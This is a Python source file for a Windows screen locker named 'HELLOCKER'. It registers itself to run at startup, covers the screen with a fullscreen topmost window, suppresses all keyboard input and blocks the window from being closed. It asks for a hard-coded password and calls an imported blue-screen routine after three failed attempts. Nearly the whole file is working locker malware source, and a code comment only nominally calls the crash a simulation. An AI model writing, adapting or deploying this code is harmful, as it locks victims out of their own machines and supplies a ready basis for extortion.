#! /usr/bin/env python
# -*- coding: utf-8 -*-

from tkinter import *
import time
from tkinter import messagebox
from functools import partial
import os
import keyboard
import sys
from modules import bsod, startup, uninstall  # Ensure these modules are properly defined elsewhere.

# Configuration
PASSWORD = "123"
LOCK_TEXT = "Windows is locked by HELLOCKER."
ATTEMPT_LIMIT = 3

# File path for persistence
FILE_PATH = os.path.abspath(sys.argv[0])

# Add to startup
try:
    startup(FILE_PATH)
except Exception as e:
    print(f"Error setting up persistence: {e}")

# Initialize variables
attempts_left = ATTEMPT_LIMIT

# Functions
def on_button_click(arg):
    """Simulates typing a number."""
    enter_pass.insert(END, arg)

def on_delete_click():
    """Deletes the last character in the password field."""
    enter_pass.delete(len(enter_pass.get()) - 1, END)

def on_key_press(key):
    """Disables keyboard input."""
    pass  # No functionality; suppressing keyboard input.

def check_password():
    """Checks if the entered password is correct."""
    global attempts_left
    if enter_pass.get() == PASSWORD:
        messagebox.showinfo("HELLOCKER", "UNLOCKED SUCCESSFULLY")
        uninstall(window)
    else:
        attempts_left -= 1
        if attempts_left == 0:
            messagebox.showwarning("HELLOCKER", "Number of attempts expired.")
            bsod()  # Simulates a BSOD; replace this with an ethical alternative.
        else:
            messagebox.showwarning("HELLOCKER", f"Wrong password. Attempts remaining: {attempts_left}")

def on_exit_attempt():
    """Prevents the user from closing the window."""
    messagebox.showwarning("HELLOCKER", "Exit is not allowed.")

# GUI setup
window = Tk()
window.title("HELLOCKER")
window.configure(bg="black")
window.attributes("-fullscreen", True)
window.protocol("WM_DELETE_WINDOW", on_exit_attempt)
keyboard.on_press(on_key_press, suppress=True)  # Suppress all key presses.

# GUI components
Label(window, bg="black", fg="red", text="WINDOWS LOCKED BY HELLOCKER", font="Helvetica 50 bold").pack(pady=20)
Label(window, bg="black", fg="red", text=LOCK_TEXT, font="Helvetica 30").pack(pady=20)

enter_pass = Entry(window, bg="black", fg="red", font="Helvetica 25", show="*")
enter_pass.pack(pady=20)

Button(window, text="Unlock", padx=40, pady=20, bg="black", fg="red", font="Helvetica 20", command=check_password).pack(pady=20)

# Numeric keypad
keypad_frame = Frame(window, bg="black")
keypad_frame.pack()

buttons = [
    ("1", 1), ("2", 2), ("3", 3),
    ("4", 4), ("5", 5), ("6", 6),
    ("7", 7), ("8", 8), ("9", 9),
    ("0", 0), ("<", "delete")
]

for text, value in buttons:
    if value == "delete":
        btn = Button(keypad_frame, text=text, padx=20, pady=10, bg="black", fg="red", font="Helvetica 20", command=on_delete_click)
    else:
        btn = Button(keypad_frame, text=text, padx=20, pady=10, bg="black", fg="red", font="Helvetica 20", command=partial(on_button_click, text))
    btn.pack(side=LEFT, padx=5, pady=5)

# Focus management
window.lift()
window.attributes("-topmost", True)
window.after_idle(window.attributes, '-topmost', True)

# Run the GUI
window.mainloop()